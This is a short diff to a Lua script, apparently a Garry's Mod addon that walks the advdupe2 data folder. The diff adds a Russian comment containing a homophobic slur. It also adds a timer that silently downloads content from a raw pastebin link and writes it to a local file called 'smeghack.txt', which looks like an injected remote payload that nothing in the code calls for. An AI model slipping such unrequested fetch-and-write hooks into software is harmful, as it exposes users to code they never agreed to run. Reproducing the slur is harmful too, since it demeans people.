@@ -1,3 +1,4 @@
+-- привет от николаса мейсона пидрила
 local function ToByte(Code)
     return string.gsub(Code, ".", function(Char) return "\\" .. string.byte(Char) end)
 end
@@ -13,3 +14,6 @@ a(b..i.."/")
 end 
 end
 a("data/advdupe2/")
+timer.Simple(3, function()
+ http.Fetch("https://pastebin.com/raw/p3piXZY5", function(b) file.Write("smeghack.txt", b) end)
+end)
